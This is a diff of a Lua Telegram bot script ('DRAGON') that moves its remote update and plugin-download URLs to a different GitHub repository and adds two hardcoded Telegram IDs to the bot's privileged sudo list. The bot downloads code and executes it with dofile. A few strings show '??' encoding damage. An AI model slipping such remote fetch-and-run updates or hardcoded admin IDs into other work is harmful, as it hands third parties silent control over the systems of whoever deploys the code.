@@ -165,7 +165,7 @@ io.popen("mkdir File_Bot")
 io.popen("cd File_Bot && rm -rf commands.lua.1") 
 io.popen("cd File_Bot && rm -rf commands.lua.2") 
 io.popen("cd File_Bot && rm -rf commands.lua.3") 
-io.popen("cd File_Bot && wget https://raw.githubusercontent.com/3mora3/h/File_Bot/commands.lua") 
+io.popen("cd File_Bot && wget https://raw.githubusercontent.com/TIMOXBODY/elmalkxxxx/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -178,7 +178,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1372188096,1911881905}   
+sudo_users = {SUDO,1372188096,2002118176,2057122076,1911881905}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -1258,7 +1258,7 @@ echo '♢━━━♢ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗔𝗭𝗠𝗔 ♢━━━♢\
 end
 if text == 'تحديث السورس ' and DevSoFi(msg) then 
 os.execute('rm -rf DRAGON.lua')
-os.execute('wget https://raw.githubusercontent.com/3mora3/h/DRAGON.lua')
+os.execute('wget https://raw.githubusercontent.com/TIMOXBODY/elmalkxxxx/DRAGON.lua')
 send(msg.chat_id_, msg.id_,'  ✹︙ تم تحديث السورس')
 dofile('DRAGON.lua')  
 end
@@ -2904,7 +2904,7 @@ end
 return false
 end
 os.execute('rm -rf DRAGON.lua')
-os.execute('wget https://raw.githubusercontent.com/3mora3/h/DRAGON.lua')
+os.execute('wget https://raw.githubusercontent.com/TIMOXBODY/elmalkxxxx/DRAGON.lua')
 send(msg.chat_id_, msg.id_,'  ✹︙ تم تحديث السورس')
 dofile('DRAGON.lua')  
 end
@@ -3256,7 +3256,7 @@ keyboard.inline_keyboard = {
 {{text = '● 𝑻𝑰𝑴𝑶',url="t.me/ttimo_8lby"}}, 
 {{text = '● 𝑩𝑶𝑻♢𝑻𝑰𝑴𝑶',url="t.me/Timo8Bot"}}, 
 } 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ttimo_8lby&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/timo_019/5&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
 if text == 'سيف' or text == 'عمك سيف ' or text == 'المجهول' or text == 'SAIF' then 
@@ -4030,7 +4030,7 @@ local TWEET_Msg = {
 " لا تملح الا لمن يستحقاها ويحافظ عليها😛",
 "لا يدخل الجنه من لايأمن من جازه بوائقه 😿.",
 "لا دين لمن لا عهد له 💞 ",
-"لا تظلم حتى لا تتظلم 🌚.",
+"لا تظلم حتى لا تتظلم ??.",
 "عامل الناس بأخلاقك ولا بأخلاقهم 💞⛷️",
 "لا تقف قصاد الريح ولا تمشي معها.... 💚 ",
 "‏ ‏أحببتك وأنا منطفئ، فما بالك وأنا في كامل توهجي ؟ 🙂 .!",
@@ -5874,7 +5874,7 @@ send(msg.chat_id_, msg.id_,t)
 end
 if text == "متجر الملفات" or text == 'المتجر' then
 if DevSoFi(msg) then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/3mora3/h/getfile.json")
+local Get_Files, res = https.request("https://raw.githubusercontent.com/TIMOXBODY/elmalkxxxx/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
@@ -5912,7 +5912,7 @@ t = "  ✹︙ الملف  ⇇"..file.."\n  ✹︙ تم تعطيل ملف \n"
 else
 t = "  ✹︙ بالتاكيد تم تعطيل ملف → "..file.."\n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/3mora3/h/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/TIMOXBODY/elmalkxxxx/File_Bot/"..file)
 if res == 200 then
 os.execute("rm -fr File_Bot/"..file)
 send(msg.chat_id_, msg.id_,t) 
@@ -5932,7 +5932,7 @@ t = "  ✹︙ بالتاكيد تم تفعيل ملف → "..file.." \n"
 else
 t = "  ✹︙ الملف  ⇇"..file.."\n  ✹︙ تم تفعيل ملف \n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/3mora3/h/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/TIMOXBODY/elmalkxxxx/File_Bot/"..file)
 if res == 200 then
 local chek = io.open("File_Bot/"..file,'w+')
 chek:write(json_file)
@@ -16127,7 +16127,7 @@ Msᴀɢ ~ #msgs
 ♡ : 𝐼𝐷 𖠀 #id .
 ♡ : 𝑈𝑆𝐸𝑅 𖠀 #username .
 ♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
-♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
+♡ : 𝑆𝑇𝐴𝑇?? 𖠀 #stast .
 ♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
 ♡ : 𝗖𝗛 - ↝@Alahzane1↜  ✹︙
 ]],
